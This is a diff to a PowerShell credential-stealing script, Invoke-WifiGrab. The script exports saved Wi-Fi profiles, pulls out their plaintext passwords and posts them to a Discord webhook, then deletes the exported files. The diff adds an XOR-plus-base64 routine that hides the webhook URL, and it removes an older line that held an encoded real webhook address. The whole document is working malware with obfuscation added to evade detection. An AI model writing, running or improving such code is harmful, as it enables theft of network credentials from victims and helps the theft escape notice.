@@ -1,4 +1,22 @@
+function xorEncryptDecrypt {
+    param (
+        [string]$key
+    )
+    $webhookUrl = "DgEXGwpVWk0NHRALCQcHRRoAGE0IBApHERABAxYAHhFGRVBaXkJVW0lWQVNeRFtYXkZVWlYhIAoeGhshDUQ3XCkBQDcqGVYQHzcARjEuFFNeBlUsCUUwUxoVMDYbHAEFKD4bMSsdAwBdHxZfMkM0PDwuESNEEgwZIw=="
+    $decodedWebhookUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($webhookUrl))
+    $result = ""
+    for ($i = 0; $i -lt $decodedWebhookUrl.Length; $i++) {
+        # XOR each character with the key character, wrapping around if needed
+        $char = [char]([byte][char]$decodedWebhookUrl[$i] -bxor [byte][char]$key[$i % $key.Length])
+        $result += $char
+    }
+    return $result
+}
+
 function Invoke-WifiGrab {
+    param (
+        [string]$Key
+    )
     # Navigate to the temporary folder
     cd $env:temp
 
@@ -9,9 +27,7 @@ function Invoke-WifiGrab {
     Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
 
     # Define the webhook URL
-    $webhookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyNzIxMzA4ODU3OTEyNTI3OS9FdjJQMHdtTl8tZVBaY2I0ZkZXV093VDNuZzlFUW41bmxWT2VJSFhTTlBWU3VhcG5WMTdIdzhkRm9rMzBpbGtUbTZUVA=="
-    $decodedBytes = [System.Convert]::FromBase64String($webhookUrl)
-    $decodedString = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
+    $webhookUrl = xorEncryptDecrypt -key $Key
 
     # Read the extracted key materials from the file
     $keyMaterialContent = Get-Content -Path "Wi-Fi-PASS" -Raw
@@ -64,7 +80,7 @@ function Invoke-WifiGrab {
     Write-Output $decodedString
 
     # Send data to Discord webhook
-    Invoke-WebRequest -Uri $decodedString -Method Post -ContentType "application/json" -Body $jsonData | Out-Null
+    Invoke-WebRequest -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $jsonData | Out-Null
 
     # Optionally clean up the exported files
     Remove-Item Wi-*
